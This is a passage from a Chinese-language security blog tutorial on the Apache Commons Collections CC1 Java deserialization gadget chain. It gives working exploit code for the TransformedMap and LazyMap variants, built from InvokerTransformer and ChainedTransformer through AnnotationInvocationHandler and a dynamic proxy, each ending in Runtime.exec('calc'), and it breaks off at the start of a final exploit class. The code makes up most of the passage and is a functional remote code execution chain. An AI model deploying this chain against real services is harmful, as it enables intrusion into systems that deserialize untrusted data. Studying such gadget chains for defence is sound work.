<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);  <span class="hljs-comment">//这里键是value就行，值随便写</span><br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br>  <br> <span class="hljs-comment">// 序列化反序列化  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><p>总结一下调用顺序：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject -&gt;</span><br> A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>.setValue -&gt;</span><br> T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>.checkSetValue -&gt;</span><br> InvokerTransformer.transform<br></code></pre></td></tr></table></figure><p>最后注意：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br>    <br>    这里的memberValues放的是transformedMap，最终会执行的是memberValue.setValue<br></code></pre></td></tr></table></figure><p><code>AnnotationInvocationHandler.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC1-Lazymap版"><a href="#CC1-Lazymap版" class="headerlink" title="CC1 Lazymap版"></a>CC1 Lazymap版</h2><p>首先，lazy类下存在get方法，这里调用了<code>transform</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-comment">// create value for key if key is not currently in the map  </span><br> <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);  <br> map.put(key, value);  <br> <span class="hljs-keyword">return</span> value;  <br> &#125;  <br>    <span class="hljs-keyword">return</span> map.get(key);  <br>&#125;<br></code></pre></td></tr></table></figure><p>transform的话还是之前那个，里面的参数放个类就行。前面的factory就是<code>invokertransformer</code>。</p><p>再往上跟一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer factory;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br><br><span class="hljs-comment">//注意这个构造方法是私有的</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = FactoryTransformer.getInstance(factory);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>私有的构造方法，还存在<code>decorate</code>这个静态方法可以实例化出一个<code>Lazymap</code>。</p><p>先利用现有的东西调个计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1_REAL1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getruntime();<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decoratemp</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap,invokerTransformer);<br>        <span class="hljs-comment">//这里其实是吧factory赋值为invokerTransformer</span><br>        <span class="hljs-comment">//其实最终的目的还是调用invokerTransformer.transform(runtime)！</span><br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-comment">//通过反射拿到get方法</span><br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getmethod</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredMethod(<span class="hljs-string">&quot;get&quot;</span>, Object.class);<br><br>        getmethod.setAccessible(<span class="hljs-literal">true</span>);<br><br>        getmethod.invoke(decoratemp,runtime);<br>        <span class="hljs-comment">//然后注意这里的两个参数，第一个decoratemp，其实就是在它上面调用这个get方法。然后得知道参数就是runtime()[即transform的参数是runtime]</span><br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ChainedTransformer包装成LazyMap，接下来我们利用get去触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lazy1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-comment">//create chain</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//LazyMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyM</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(hashMap, transformerChain);<br>        <span class="hljs-comment">//poc</span><br>        lazyM.get(<span class="hljs-string">&quot;foo&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个get的值随便写就行，因为调用 LazyMap 的 get 方法时，如果该键对应的值不存在，LazyMap 会根据键和 Transformer  链生成一个新的值。在这个过程中，LazyMap 会依次应用 Transformer 链中的每一个 Transformer 对象，将前一个  Transformer 的输出作为后一个 Transformer 的输入，最终生成值。虽然后面transform()里面要放个对象进去，不过由于ConstantTransformer的存在最终还是变成<code>Runtime</code>，后面就是那个链式反应。</p><p>这这东西打个断点调试一下就知道了：</p><p><img src="/img/image-20240316195339864.png" alt="image-20240316195339864"></p><p><code>AnnotationInvocationHandler.invoke()</code> 方法调用了 <code>get()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>        <span class="hljs-comment">// Handle Object and Annotation methods</span><br>        <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>            paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>            <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>        <span class="hljs-keyword">switch</span>(member) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>            <span class="hljs-keyword">return</span> toStringImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>            <span class="hljs-keyword">return</span> hashCodeImpl();<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>            <span class="hljs-keyword">return</span> type;<br>        &#125;<br><br>        <span class="hljs-comment">// Handle annotation member accessors</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br></code></pre></td></tr></table></figure><p>对某个对象使用Proxy.newProxyInstance进行动态代理并传入有实现invoke的相应hanlder对象（比如这里的AnnotationInvocationHandler），当调用方法时，就会跳转到这个handler对象的invoke方法。接着我们再来看下这个this.memberValues是否可控并能否设置为LazyMap，查看构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6182022883658399397L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>memberValues</code>可控。对于<code>invoke</code>这个方法来说，会在代理对象的任意方法被调用时调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p><code>readobject</code>方法中恰好存在<code>for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</code>。调用了memberValues的<code>entrySet()</code>方法，触发这个方法的时候会自动走到<code>memberValues</code>的invoke()方法。</p><p>把一个AnnotationInvocationHandler对象作为LazyMap动态代理的handler,最后再把代理后的LazyMap再赋值给一个新的Ann…Handler</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) ctor.newInstance(Retention.class, lazyM);<br>        <span class="hljs-comment">//set the handler for lazyM</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyLazyM</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyM.getClass().getClassLoader(), lazyM.getClass().getInterfaces(),handler);<br>        <span class="hljs-comment">//set the memberValues to proxyLazyM</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> ctor.newInstance(Retention.class, proxyLazyM);<br></code></pre></td></tr></table></figure><p>这里我们利用newinstance弄了两个<code>AnnotationInvocationHandler</code>对象，其实第一个就是拿来当作动态代理的<code>handler</code>的。第二个是拿来当代理以触发<code>readobject</code>中的<code>entrySet()</code>方法。</p><p>最终EXP(参考了DB师傅的文章):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoChainsEXP;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// 正版 CC1 链最终 EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyFinalEXP</span> &#123;  <br>    <span 